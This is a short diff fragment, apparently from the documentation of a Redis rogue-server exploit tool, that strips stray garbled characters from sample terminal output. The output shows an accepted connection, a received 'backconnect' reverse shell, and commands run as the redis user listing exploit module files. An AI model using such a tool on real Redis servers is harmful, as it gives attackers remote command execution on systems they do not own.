@@ -24,13 +24,13 @@ Accepted connection from 192.168.2.18:21000
 [*] Closing rogue server...
 Received backconnect, use exit to exit...
 $
-葝?
+
 $ id
-8嵢uid=100(redis) gid=101(redis) groups=101(redis),101(redis)
+uid=100(redis) gid=101(redis) groups=101(redis),101(redis)
 $ pwd
-皪?/tmp
+/tmp
 $ ls
-貙?exp_lin.so
+exp_lin.so
 exp_osx.so
 $
 
